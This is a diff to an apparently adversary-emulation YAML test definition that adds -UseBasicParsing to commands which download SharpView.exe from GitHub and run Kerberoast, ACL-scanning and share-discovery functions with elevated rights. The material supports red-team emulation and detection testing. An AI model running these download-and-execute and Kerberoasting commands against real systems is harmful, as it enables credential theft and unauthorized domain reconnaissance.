@@ -15,9 +15,9 @@
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
           "PathToAtomicsFolder\..\ExternalPayloads\SharpView.exe") -ErrorAction ignore
           | Out-Null; Invoke-WebRequest https://github.com/tevora-threat/SharpView/blob/b60456286b41bb055ee7bc2a14d645410cca9b74/Compiled/SharpView.exe?raw=true
-          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpView.exe"; fi; $syntaxList
-          = "Invoke-ACLScanner", "Invoke-Kerberoast", "Find-DomainShare"; foreach
-          ($syntax in $syntaxList) {; PathToAtomicsFolder\..\ExternalPayloads\SharpView.exe
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpView.exe" -UseBasicParsing;
+          fi; $syntaxList = "Invoke-ACLScanner", "Invoke-Kerberoast", "Find-DomainShare";
+          foreach ($syntax in $syntaxList) {; PathToAtomicsFolder\..\ExternalPayloads\SharpView.exe
           $syntax -}'
         elevation_required: true
   plugin: atomic
@@ -57,9 +57,9 @@
       get_prereq_command: 'New-Item -Type Directory (split-path "#{SharpView}") -ErrorAction
         ignore | Out-Null
 
-        Invoke-WebRequest #{SharpView_url} -OutFile "#{SharpView}"
+        Invoke-WebRequest #{SharpView_url} -OutFile "#{SharpView}" -UseBasicParsing
 
         '
     technique_created: '2017-05-31T21:30:45.139Z'
     atomic_guid: 96f974bb-a0da-4d87-a744-ff33e73367e9
-    import_timestamp: '2026-10-20T07:08:30.755447Z'
+    import_timestamp: '2026-10-21T07:01:52.591489Z'
